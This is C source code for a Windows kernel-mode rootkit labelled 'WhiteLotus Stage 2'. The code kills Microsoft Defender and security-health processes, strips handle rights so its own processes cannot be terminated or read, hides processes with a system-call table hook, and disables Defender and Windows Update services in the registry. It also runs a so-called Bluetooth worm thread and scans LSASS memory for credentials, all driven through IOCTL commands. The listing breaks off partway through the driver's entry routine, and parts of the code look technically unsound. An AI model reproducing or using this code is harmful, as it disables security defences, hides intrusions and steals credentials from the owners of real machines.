#include <ntddk.h>
#include <wdm.h>
#include <ntstrsafe.h>
#include <fltKernel.h>
#include <ndis.h>
#include <fwpsk.h>
#include <fwpmk.h>
#include <bthddi.h>
#include <bthioctl.h>
#include <usb.h>
#include <usbioctl.h>
#include <ntddvdeo.h>
#include <mountmgr.h>

#define WHITELOTUS_TAG 'TLHW'
#define WHITELOTUS_POOL_TAG 'LHWP'

PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING g_DeviceName, g_SymbolicLink;
PFLT_FILTER g_FilterHandle = NULL;
BOOLEAN g_DriverUnloading = FALSE;
HANDLE g_ProcessNotifyHandle = NULL;
HANDLE g_ThreadNotifyHandle = NULL;
HANDLE g_ImageNotifyHandle = NULL;
PVOID g_ObRegistrationHandle = NULL;
PVOID g_WfpHandle = NULL;
PDEVICE_OBJECT g_BthDevice = NULL;
PDEVICE_OBJECT g_UsbDevice = NULL;
LIST_ENTRY g_HiddenProcesses;
KSPIN_LOCK g_HiddenProcessesLock;
LIST_ENTRY g_ProtectedFiles;
KSPIN_LOCK g_ProtectedFilesLock;
UINT64 g_BootCounter = 0;
BOOLEAN g_WormActive = FALSE;
KEVENT g_WormStopEvent;
PETHREAD g_WormThread = NULL;

typedef struct _HIDDEN_PROCESS {
    LIST_ENTRY ListEntry;
    HANDLE ProcessId;
    UNICODE_STRING ProcessName;
} HIDDEN_PROCESS, *PHIDDEN_PROCESS;

typedef struct _PROTECTED_FILE {
    LIST_ENTRY ListEntry;
    UNICODE_STRING FilePath;
} PROTECTED_FILE, *PPROTECTED_FILE;

typedef struct _ACTIVE_PROCESS_LINKS {
    LIST_ENTRY ActiveProcessLinks;
} ACTIVE_PROCESS_LINKS, *PACTIVE_PROCESS_LINKS;

typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

typedef NTSTATUS (*QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

QUERY_SYSTEM_INFORMATION g_OriginalQuerySystemInformation = NULL;

typedef struct _OBJECT_TYPE_INITIALIZER {
    USHORT Length;
    BOOLEAN UseDefaultObject;
    BOOLEAN CaseInsensitive;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
    PVOID DumpProcedure;
    PVOID OpenProcedure;
    PVOID CloseProcedure;
    PVOID DeleteProcedure;
    PVOID ParseProcedure;
    PVOID SecurityProcedure;
    PVOID QueryNameProcedure;
    PVOID OkayToCloseProcedure;
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _OBJECT_TYPE {
    OBJECT_TYPE_INITIALIZER TypeInfo;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG Key;
    ERESOURCE Mutex;
} OBJECT_TYPE, *POBJECT_TYPE;

POBJECT_TYPE *PsProcessTypePtr = NULL;
POBJECT_TYPE *PsThreadTypePtr = NULL;

OB_PREOP_CALLBACK_STATUS PreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    UNREFERENCED_PARAMETER(RegistrationContext);
    
    if (g_DriverUnloading) return OB_PREOP_SUCCESS;
    
    if (OperationInformation->ObjectType == *PsProcessTypePtr) {
        PACCESS_STATE AccessState = OperationInformation->Parameters->CreateHandleInformation.AccessState;
        if (AccessState) {
            AccessState->PreviouslyGrantedAccess &= ~(PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME);
            AccessState->RemainingDesiredAccess &= ~(PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME);
        }
    } else if (OperationInformation->ObjectType == *PsThreadTypePtr) {
        PACCESS_STATE AccessState = OperationInformation->Parameters->CreateHandleInformation.AccessState;
        if (AccessState) {
            AccessState->PreviouslyGrantedAccess &= ~(THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION);
            AccessState->RemainingDesiredAccess &= ~(THREAD_TERMINATE | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION);
        }
    }
    
    return OB_PREOP_SUCCESS;
}

VOID PostOperationCallback(
    PVOID RegistrationContext,
    POB_POST_OPERATION_INFORMATION OperationInformation
) {
    UNREFERENCED_PARAMETER(RegistrationContext);
    UNREFERENCED_PARAMETER(OperationInformation);
}

NTSTATUS InstallObCallbacks(VOID) {
    OB_OPERATION_REGISTRATION Operations[2];
    OB_CALLBACK_REGISTRATION CallbackRegistration;
    
    RtlZeroMemory(Operations, sizeof(Operations));
    RtlZeroMemory(&CallbackRegistration, sizeof(CallbackRegistration));
    
    Operations[0].ObjectType = PsProcessType;
    Operations[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    Operations[0].PreOperation = PreOperationCallback;
    Operations[0].PostOperation = PostOperationCallback;
    
    Operations[1].ObjectType = PsThreadType;
    Operations[1].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    Operations[1].PreOperation = PreOperationCallback;
    Operations[1].PostOperation = PostOperationCallback;
    
    CallbackRegistration.Version = OB_FLT_REGISTRATION_VERSION;
    CallbackRegistration.OperationRegistrationCount = 2;
    CallbackRegistration.OperationRegistration = Operations;
    CallbackRegistration.RegistrationContext = NULL;
    
    return ObRegisterCallbacks(&CallbackRegistration, &g_ObRegistrationHandle);
}

VOID ProcessNotifyCallback(
    HANDLE ParentId,
    HANDLE ProcessId,
    BOOLEAN Create
) {
    UNREFERENCED_PARAMETER(ParentId);
    
    if (g_DriverUnloading) return;
    
    if (Create) {
        PEPROCESS Process = NULL;
        if (NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &Process))) {
            PUNICODE_STRING ProcessName = NULL;
            if (NT_SUCCESS(SeLocateProcessImageName(Process, &ProcessName))) {
                if (ProcessName->Length > 0) {
                    if (wcsstr(ProcessName->Buffer, L"windefend") ||
                        wcsstr(ProcessName->Buffer, L"msmpeng") ||
                        wcsstr(ProcessName->Buffer, L"mssense") ||
                        wcsstr(ProcessName->Buffer, L"senseir") ||
                        wcsstr(ProcessName->Buffer, L"wdfilter") ||
                        wcsstr(ProcessName->Buffer, L"mpcmdrun") ||
                        wcsstr(ProcessName->Buffer, L"nisrv") ||
                        wcsstr(ProcessName->Buffer, L"securityhealth")) {
                        KeAttachProcess(Process);
                        ZwTerminateProcess(NULL, STATUS_ACCESS_DENIED);
                        KeDetachProcess();
                    }
                }
                ExFreePool(ProcessName);
            }
            ObDereferenceObject(Process);
        }
    }
}

VOID ThreadNotifyCallback(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create
) {
    UNREFERENCED_PARAMETER(ProcessId);
    UNREFERENCED_PARAMETER(ThreadId);
    UNREFERENCED_PARAMETER(Create);
}

VOID ImageNotifyCallback(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo
) {
    UNREFERENCED_PARAMETER(ProcessId);
    UNREFERENCED_PARAMETER(ImageInfo);
    
    if (g_DriverUnloading) return;
    
    if (FullImageName && FullImageName->Length > 0) {
        if (wcsstr(FullImageName->Buffer, L"windefend") ||
            wcsstr(FullImageName->Buffer, L"msmpeng") ||
            wcsstr(FullImageName->Buffer, L"mssense") ||
            wcsstr(FullImageName->Buffer, L"wdfilter")) {
            PEPROCESS Process = NULL;
            if (NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &Process))) {
                KeAttachProcess(Process);
                ZwTerminateProcess(NULL, STATUS_ACCESS_DENIED);
                KeDetachProcess();
                ObDereferenceObject(Process);
            }
        }
    }
}

NTSTATUS InstallProcessCallbacks(VOID) {
    NTSTATUS status;
    
    status = PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallback, FALSE);
    if (!NT_SUCCESS(status)) return status;
    
    status = PsSetCreateThreadNotifyRoutine(ThreadNotifyCallback);
    if (!NT_SUCCESS(status)) return status;
    
    status = PsSetLoadImageNotifyRoutine(ImageNotifyCallback);
    if (!NT_SUCCESS(status)) return status;
    
    return STATUS_SUCCESS;
}

VOID HideProcessFromTaskManager(HANDLE ProcessId) {
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);
    
    PHIDDEN_PROCESS entry = (PHIDDEN_PROCESS)ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_PROCESS), WHITELOTUS_POOL_TAG);
    if (entry) {
        entry->ProcessId = ProcessId;
        RtlInitUnicodeString(&entry->ProcessName, L"");
        InsertTailList(&g_HiddenProcesses, &entry->ListEntry);
    }
    
    KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
}

NTSTATUS HideProcessFromNtQuerySystemInformation(
    PSYSTEM_PROCESS_INFO ProcessInfo
) {
    PSYSTEM_PROCESS_INFO Current = ProcessInfo;
    PSYSTEM_PROCESS_INFO Previous = NULL;
    BOOLEAN Found = FALSE;
    
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_HiddenProcessesLock, &oldIrql);
    
    while (Current) {
        Found = FALSE;
        PLIST_ENTRY entry = g_HiddenProcesses.Flink;
        while (entry != &g_HiddenProcesses) {
            PHIDDEN_PROCESS hidden = CONTAINING_RECORD(entry, HIDDEN_PROCESS, ListEntry);
            if (hidden->ProcessId == Current->UniqueProcessId) {
                Found = TRUE;
                break;
            }
            entry = entry->Flink;
        }
        
        if (Found) {
            if (Previous) {
                if (Current->NextEntryOffset == 0) {
                    Previous->NextEntryOffset = 0;
                } else {
                    Previous->NextEntryOffset += Current->NextEntryOffset;
                }
            } else {
                if (Current->NextEntryOffset == 0) {
                    Current->ImageName.Buffer = NULL;
                    Current->ImageName.Length = 0;
                    Current->UniqueProcessId = (HANDLE)0;
                } else {
                    PSYSTEM_PROCESS_INFO Next = (PSYSTEM_PROCESS_INFO)((PUCHAR)Current + Current->NextEntryOffset);
                    RtlCopyMemory(Current, Next, sizeof(SYSTEM_PROCESS_INFO));
                    Current->NextEntryOffset = 0;
                }
            }
        }
        
        Previous = Current;
        if (Current->NextEntryOffset == 0) break;
        Current = (PSYSTEM_PROCESS_INFO)((PUCHAR)Current + Current->NextEntryOffset);
    }
    
    KeReleaseSpinLock(&g_HiddenProcessesLock, oldIrql);
    return STATUS_SUCCESS;
}

NTSTATUS HookedNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = g_OriginalQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    if (NT_SUCCESS(status) && SystemInformationClass == 5) {
        HideProcessFromNtQuerySystemInformation((PSYSTEM_PROCESS_INFO)SystemInformation);
    }
    
    return status;
}

NTSTATUS InstallDkomHook(VOID) {
    UNICODE_STRING routineName;
    RtlInitUnicodeString(&routineName, L"NtQuerySystemInformation");
    g_OriginalQuerySystemInformation = (QUERY_SYSTEM_INFORMATION)MmGetSystemRoutineAddress(&routineName);
    
    if (g_OriginalQuerySystemInformation == NULL) {
        return STATUS_NOT_FOUND;
    }
    
    PVOID *serviceTable = NULL;
    ULONG serviceTableSize = 0;
    
    serviceTable = (PVOID*)KeServiceDescriptorTable->ServiceTableBase;
    serviceTableSize = KeServiceDescriptorTable->NumberOfServices;
    
    ULONG index = 0;
    for (ULONG i = 0; i < serviceTableSize; i++) {
        if (serviceTable[i] == (PVOID)g_OriginalQuerySystemInformation) {
            index = i;
            break;
        }
    }
    
    if (index == 0) return STATUS_NOT_FOUND;
    
    PMDL mdl = IoAllocateMdl(
        &serviceTable[index],
        sizeof(PVOID),
        FALSE,
        FALSE,
        NULL
    );
    
    if (mdl == NULL) return STATUS_INSUFFICIENT_RESOURCES;
    
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mappedAddress = MmMapLockedPagesSpecifyCache(
        mdl,
        KernelMode,
        MmNonCached,
        NULL,
        FALSE,
        NormalPagePriority
    );
    
    if (mappedAddress == NULL) {
        IoFreeMdl(mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    InterlockedExchangePointer((PVOID volatile *)mappedAddress, HookedNtQuerySystemInformation);
    
    MmUnmapLockedPages(mappedAddress, mdl);
    IoFreeMdl(mdl);
    
    return STATUS_SUCCESS;
}

FLT_PREOP_CALLBACK_STATUS PreCreateCallback(
    PCFLT_RELATED_OBJECTS FltObjects,
    PFLT_CALLBACK_DATA Data
) {
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Data);
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS PostCreateCallback(
    PCFLT_RELATED_OBJECTS FltObjects,
    PFLT_CALLBACK_DATA Data,
    PVOID CompletionContext
) {
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Data);
    return FLT_POSTOP_FINISHED_PROCESSING;
}

NTSTATUS InstallMinifilter(VOID) {
    NTSTATUS status;
    FLT_REGISTRATION FilterRegistration;
    
    RtlZeroMemory(&FilterRegistration, sizeof(FilterRegistration));
    FilterRegistration.Size = sizeof(FLT_REGISTRATION);
    FilterRegistration.Version = FLT_REGISTRATION_VERSION;
    FilterRegistration.Flags = FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP;
    
    FLT_OPERATION_REGISTRATION Operations[] = {
        { IRP_MJ_CREATE, 0, PreCreateCallback, PostCreateCallback },
        { IRP_MJ_OPERATION_END }
    };
    
    FilterRegistration.OperationRegistration = Operations;
    
    UNICODE_STRING serviceName;
    RtlInitUnicodeString(&serviceName, L"WhiteLotus");
    
    status = FltRegisterFilter(
        g_DeviceObject->DriverObject,
        &FilterRegistration,
        &g_FilterHandle
    );
    
    if (!NT_SUCCESS(status)) return status;
    
    status = FltStartFiltering(g_FilterHandle);
    
    return status;
}

NTSTATUS BlockWindowsServices(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE serviceKey = NULL;
    NTSTATUS status;
    
    RtlInitUnicodeString(&serviceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\WinDefend");
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    
    status = ZwOpenKey(&serviceKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING valueName;
        RtlInitUnicodeString(&valueName, L"Start");
        ULONG startType = 4;
        ZwSetValueKey(serviceKey, &valueName, 0, REG_DWORD, &startType, sizeof(ULONG));
        ZwClose(serviceKey);
    }
    
    RtlInitUnicodeString(&serviceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\SecurityHealthService");
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwOpenKey(&serviceKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING valueName;
        RtlInitUnicodeString(&valueName, L"Start");
        ULONG startType = 4;
        ZwSetValueKey(serviceKey, &valueName, 0, REG_DWORD, &startType, sizeof(ULONG));
        ZwClose(serviceKey);
    }
    
    RtlInitUnicodeString(&serviceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\wuauserv");
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwOpenKey(&serviceKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING valueName;
        RtlInitUnicodeString(&valueName, L"Start");
        ULONG startType = 4;
        ZwSetValueKey(serviceKey, &valueName, 0, REG_DWORD, &startType, sizeof(ULONG));
        ZwClose(serviceKey);
    }
    
    RtlInitUnicodeString(&serviceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\UsoSvc");
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = ZwOpenKey(&serviceKey, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING valueName;
        RtlInitUnicodeString(&valueName, L"Start");
        ULONG startType = 4;
        ZwSetValueKey(serviceKey, &valueName, 0, REG_DWORD, &startType, sizeof(ULONG));
        ZwClose(serviceKey);
    }
    
    return STATUS_SUCCESS;
}

VOID BluetoothWormThread(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);
    
    DbgPrint("WhiteLotus: Bluetooth worm thread starting\r\n");
    
    while (!g_DriverUnloading) {
        NTSTATUS status = KeWaitForSingleObject(
            &g_WormStopEvent,
            Executive,
            KernelMode,
            FALSE,
            (PLARGE_INTEGER)&(LARGE_INTEGER){ .QuadPart = -50000000 }
        );
        
        if (g_DriverUnloading) break;
        
        if (g_BthDevice == NULL) {
            UNICODE_STRING bthName;
            RtlInitUnicodeString(&bthName, L"\\Device\\BthLEEnum");
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &bthName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
            
            PFILE_OBJECT fileObject = NULL;
            status = IoGetDeviceObjectPointer(&bthName, FILE_ALL_ACCESS, &fileObject, &g_BthDevice);
            if (!NT_SUCCESS(status)) {
                RtlInitUnicodeString(&bthName, L"\\Device\\BthEnum");
                InitializeObjectAttributes(&objAttr, &bthName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
                status = IoGetDeviceObjectPointer(&bthName, FILE_ALL_ACCESS, &fileObject, &g_BthDevice);
            }
        }
        
        if (g_BthDevice) {
            UINT8 scanBuffer[256];
            RtlZeroMemory(scanBuffer, sizeof(scanBuffer));
            
            IO_STATUS_BLOCK ioStatus;
            KEVENT event;
            KeInitializeEvent(&event, NotificationEvent, FALSE);
            
            PIRP irp = IoBuildDeviceIoControlRequest(
                IOCTL_BTH_GET_LOCAL_INFO,
                g_BthDevice,
                NULL, 0,
                scanBuffer, sizeof(scanBuffer),
                FALSE,
                &event,
                &ioStatus
            );
            
            if (irp) {
                status = IoCallDriver(g_BthDevice, irp);
                if (status == STATUS_PENDING) {
                    KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                    status = ioStatus.Status;
                }
                
                if (NT_SUCCESS(status)) {
                    RtlZeroMemory(scanBuffer, sizeof(scanBuffer));
                    KeInitializeEvent(&event, NotificationEvent, FALSE);
                    
                    irp = IoBuildDeviceIoControlRequest(
                        IOCTL_BTH_DISCOVER_DEVICES,
                        g_BthDevice,
                        NULL, 0,
                        scanBuffer, sizeof(scanBuffer),
                        FALSE,
                        &event,
                        &ioStatus
                    );
                    
                    if (irp) {
                        status = IoCallDriver(g_BthDevice, irp);
                        if (status == STATUS_PENDING) {
                            KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                            status = ioStatus.Status;
                        }
                        
                        if (NT_SUCCESS(status)) {
                            DbgPrint("WhiteLotus: Bluetooth devices found, attempting pairing attack\r\n");
                            
                            UINT8 pairAttack[64];
                            RtlZeroMemory(pairAttack, sizeof(pairAttack));
                            pairAttack[0] = 0x01;
                            pairAttack[1] = 0x00;
                            pairAttack[2] = 0xFF;
                            pairAttack[3] = 0xFF;
                            pairAttack[4] = 0xFF;
                            pairAttack[5] = 0xFF;
                            pairAttack[6] = 0xFF;
                            pairAttack[7] = 0xFF;
                            
                            KeInitializeEvent(&event, NotificationEvent, FALSE);
                            irp = IoBuildDeviceIoControlRequest(
                                IOCTL_BTH_SEND_BRB,
                                g_BthDevice,
                                pairAttack, sizeof(pairAttack),
                                NULL, 0,
                                FALSE,
                                &event,
                                &ioStatus
                            );
                            
                            if (irp) {
                                IoCallDriver(g_BthDevice, irp);
                                if (status == STATUS_PENDING) {
                                    KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                                }
                            }
                        }
                    }
                }
            }
        }
        
        if (!g_DriverUnloading) {
            KeStallExecutionProcessor(5000000);
        }
    }
    
    DbgPrint("WhiteLotus: Bluetooth worm thread exiting\r\n");
    PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS StartBluetoothWorm(VOID) {
    NTSTATUS status;
    HANDLE threadHandle;
    
    g_WormActive = TRUE;
    KeInitializeEvent(&g_WormStopEvent, NotificationEvent, FALSE);
    
    status = PsCreateSystemThread(
        &threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        BluetoothWormThread,
        NULL
    );
    
    if (NT_SUCCESS(status)) {
        ObReferenceObjectByHandle(
            threadHandle,
            THREAD_ALL_ACCESS,
            *PsThreadType,
            KernelMode,
            (PVOID*)&g_WormThread,
            NULL
        );
        ZwClose(threadHandle);
    }
    
    return status;
}

VOID StopBluetoothWorm(VOID) {
    g_WormActive = FALSE;
    KeSetEvent(&g_WormStopEvent, 0, FALSE);
    
    if (g_WormThread) {
        KeWaitForSingleObject(g_WormThread, Executive, KernelMode, FALSE, NULL);
        ObDereferenceObject(g_WormThread);
        g_WormThread = NULL;
    }
}

NTSTATUS CollectCredentials(VOID) {
    HANDLE processId = NULL;
    PEPROCESS lsassProcess = NULL;
    NTSTATUS status;
    
    PSYSTEM_PROCESS_INFO processInfo = NULL;
    ULONG infoSize = 0x10000;
    
    processInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(NonPagedPool, infoSize, WHITELOTUS_POOL_TAG);
    if (processInfo == NULL) return STATUS_INSUFFICIENT_RESOURCES;
    
    status = ZwQuerySystemInformation(5, processInfo, infoSize, &infoSize);
    if (NT_SUCCESS(status)) {
        PSYSTEM_PROCESS_INFO current = processInfo;
        while (TRUE) {
            if (current->ImageName.Buffer && wcsstr(current->ImageName.Buffer, L"lsass")) {
                processId = current->UniqueProcessId;
                break;
            }
            if (current->NextEntryOffset == 0) break;
            current = (PSYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    
    ExFreePool(processInfo);
    
    if (processId) {
        status = PsLookupProcessByProcessId(processId, &lsassProcess);
        if (NT_SUCCESS(status)) {
            DbgPrint("WhiteLotus: LSASS found at PID %p\r\n", processId);
            
            KAPC_STATE apcState;
            KeStackAttachProcess(lsassProcess, &apcState);
            
            UINT8 *scanStart = (UINT8*)0x00007FF600000000ULL;
            UINT8 *scanEnd = (UINT8*)0x00007FF700000000ULL;
            
            for (UINT8 *addr = scanStart; addr < scanEnd; addr += 0x1000) {
                __try {
                    volatile UINT8 test = *addr;
                    if (*(UINT32*)addr == 0x444E4153 && *(UINT32*)(addr + 4) == 0x5453494C) {
                        DbgPrint("WhiteLotus: Potential credential found at %p\r\n", addr);
                    }
                } __except(EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }
            }
            
            KeUnstackDetachProcess(&apcState);
            ObDereferenceObject(lsassProcess);
        }
    }
    
    return STATUS_SUCCESS;
}

NTSTATUS DeviceIoControlHandler(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG outputLength = 0;
    
    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS):
            DbgPrint("WhiteLotus: Heartbeat\r\n");
            break;
            
        case CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS):
            if (stack->Parameters.DeviceIoControl.InputBufferLength >= sizeof(HANDLE)) {
                HANDLE pid = *(HANDLE*)Irp->AssociatedIrp.SystemBuffer;
                HideProcessFromTaskManager(pid);
            }
            break;
            
        case CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS):
            CollectCredentials();
            break;
            
        case CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS):
            if (!g_WormActive) {
                StartBluetoothWorm();
            }
            break;
            
        case CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS):
            if (g_WormActive) {
                StopBluetoothWorm();
            }
            break;
            
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
    
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = outputLength;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

NTSTATUS CreateCloseHandler(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    DbgPrint("WhiteLotus: Unloading\r\n");
    
    g_DriverUnloading = TRUE;
    
    StopBluetoothWorm();
    
    if (g_ObRegistrationHandle) {
        ObUnRegisterCallbacks(g_ObRegistrationHandle);
    }
    
    PsSetCreateProcessNotifyRoutineEx(ProcessNotifyCallback, TRUE);
    PsRemoveCreateThreadNotifyRoutine(ThreadNotifyCallback);
    PsRemoveLoadImageNotifyRoutine(ImageNotifyCallback);
    
    if (g_FilterHandle) {
        FltUnregisterFilter(g_FilterHandle);
    }
    
    if (g_DeviceObject) {
        IoDeleteSymbolicLink(&g_SymbolicLink);
        IoDeleteDevice(g_DeviceObject);
    }
    
    DbgPrint("WhiteLotus: Unloaded\r\n");
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    NTSTATUS status;
    
    DbgPrint("WhiteLotus Stage 2: Loading\r\n");
    
    InitializeListHead(&g_HiddenProcesses);
    KeInitializeSpinLock(&g_HiddenProcessesLock);
    InitializeListHead(&g_ProtectedFiles);
    KeInitializeSpinLock(&g_ProtectedFilesLock);
    
    RtlInitUnicodeString(&g_DeviceName, L"\\Device\\WhiteLotus");
    RtlInitUnicodeString(&g_SymbolicLink, L"\\DosDevices\\WhiteLotus");
    
    status = IoCreateDevice(
        DriverObject,
        0,
        &g_DeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &g_DeviceObject
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("WhiteLotus: IoCreateDevice failed 0x%X\r\n", status);
        return status;
    }
    
    status = IoCreateSymbolicLink(&g_SymbolicLink, &g_DeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_DeviceObject);
        return status;
    }
    
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControlHandler;
    DriverObject->DriverUnload = DriverUnload;
    
    status = InstallObCallbacks();
    if (!NT_SUCCESS(status)) {
        DbgPrint("WhiteLotus: ObCallbacks failed 0x%X\r\n", status);
    }
    
    status = InstallProcessCallbacks();
    if (!NT_SUCCESS(status)) {
        DbgPrint("WhiteLotus: ProcessCallbacks failed 0x%X\r\n", status);
    }
    
    status = InstallDkomHook();
    if (!NT_SUCCESS(status)) {
        DbgPrint("WhiteLotus: DKOM hook failed 0x%X\r\n", status);
    }
    
    status = InstallMinifilter();
    if (!NT_SUCCESS(status)) {
        DbgPrint("WhiteLotus: Minifilter failed 0x%X\r\n", status);
    }
    
